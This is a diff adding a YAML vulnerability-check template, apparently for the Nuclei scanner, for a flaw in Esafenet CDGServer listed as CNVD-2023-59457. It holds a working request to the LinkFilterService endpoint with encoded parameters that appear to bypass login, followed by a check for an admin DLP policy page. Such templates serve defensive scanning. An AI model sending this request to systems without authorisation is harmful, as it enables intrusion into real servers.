@@ -1,0 +1,36 @@
+id: esafenet-cdgserver-rce
+info:
+  name: 亿赛通 CDGServer - 远程代码执行漏洞
+  author: Chaitin
+  severity: critical
+  reference:
+  - https://stack.chaitin.com/vuldb/detail/49323d29-68eb-4fe9-ba5a-b8eb13345de0
+  classification:
+    cnvd-id: CNVD-2023-59457
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: esafenet
+    product: cdgserver
+    vuln-id: CNVD-2023-59457
+  tags: rce,vuln,esafenet,cdgserver,cnvd,cnvd2023
+flow: http(1) && http(2)
+http:
+- method: POST
+  path:
+  - '{{BaseURL}}/CDGServer3//LinkFilterService'
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  body: |
+    path=BOFGGPFBFIFPBHFMGKGI&userId=GCGHGAGGFAFHFGFCFEFPFD&cur=DBNJOADCFBOPECMNBCOHMDMDKGCMMLFFCJCACB
+  matchers:
+  - type: dsl
+    dsl:
+    - 'contains(header, ''frame.jsp'')'
+- method: GET
+  path:
+  - '{{BaseURL}}/CDGServer3/sip-jsp/dlp-policy/dlpPolicyManage.jsp'
+  matchers:
+  - type: dsl
+    dsl:
+    - 'contains(body, ''dlpPolicyGrid'')'
